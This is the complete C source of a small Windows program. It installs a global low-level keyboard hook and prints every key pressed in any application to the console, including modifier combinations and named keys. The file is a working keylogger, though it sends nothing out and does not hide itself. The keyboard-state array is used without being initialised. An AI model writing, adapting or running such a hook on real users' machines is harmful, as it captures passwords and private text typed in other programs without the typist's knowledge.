/**
 * \file main.c
 * \author Isaiah Lateer
 *
 * Entry point for the project.
 */

#include <stdio.h>
#include <stdlib.h>

#include <windows.h>

/**
 * Handles hook messages.
 *
 * \param[in] code Hook code.
 * \param[in] wparam Message information.
 * \param[in] lparam Additional message information.
 * \return Resulting value from CallNextHookEx.
 */
LRESULT CALLBACK hook_procedure(int code, WPARAM wparam, LPARAM lparam) {
    if (code == HC_ACTION &&
        (wparam == WM_KEYDOWN || wparam == WM_SYSKEYDOWN)) {

        KBDLLHOOKSTRUCT const* input = (KBDLLHOOKSTRUCT const*) lparam;
        
        BYTE keyboard[256];
        if (GetAsyncKeyState(VK_SHIFT) & 32768) {
            keyboard[VK_SHIFT] |= 128;
        } else {
            keyboard[VK_SHIFT] = 0;
        }

        if (GetKeyState(VK_CAPITAL) & 1) {
            keyboard[VK_CAPITAL] |= 1;
        } else {
            keyboard[VK_CAPITAL] = 0;
        }

        WCHAR buffer[4] = { 0 };
        int const count = ToUnicode(
            input->vkCode,
            input->scanCode,
            keyboard,
            buffer,
            sizeof(buffer) / sizeof(*buffer),
            0);

        if (count && buffer[0] >= 32 && buffer[0] != 127) {
            BOOL const ctrl = (GetAsyncKeyState(VK_CONTROL) & 32768);
            BOOL const alt = (GetAsyncKeyState(VK_MENU) & 32768);

            if (ctrl) {
                if (alt) {
                    printf("[Ctrl + Alt + %ls]", buffer);
                } else {
                    printf("[Ctrl + %ls]", buffer);
                }
            } else if (alt) {
                printf("[Alt + %ls]", buffer);
            } else {
                printf("%ls", buffer);
            }
        } else if (input->vkCode != VK_CAPITAL &&
            input->vkCode != VK_LSHIFT &&
            input->vkCode != VK_RSHIFT &&
            input->vkCode != VK_LCONTROL &&
            input->vkCode != VK_RCONTROL &&
            input->vkCode != VK_LMENU &&
            input->vkCode != VK_RMENU) {

            LONG key = (input->scanCode & 255) << 16;
            if (input->flags & LLKHF_EXTENDED) {
                key |= 1 << 24;
            }

            WCHAR name[64] = { 0 };
            if (GetKeyNameTextW(
                key,
                name,
                sizeof(name) / sizeof(*name)) > 0) {

                printf("[%ls]", name);
            }
        }
    }

    return CallNextHookEx(NULL, code, wparam, lparam);
}

/**
 * Entry point for the project.
 *
 * \return Exit code.
 */
int main() {
    HINSTANCE instance = GetModuleHandle(NULL);
    if (!instance) {
        fprintf(stderr, "[ERROR] Failed to get instance: GetModuleHandle.");
        return EXIT_FAILURE;
    }

    HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, hook_procedure, instance, 0);
    if (!hook) {
        fprintf(stderr, "[ERROR] Failed to set hook: SetWindowsHookEx.");
        return EXIT_FAILURE;
    }

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(hook);

    return EXIT_SUCCESS;
}
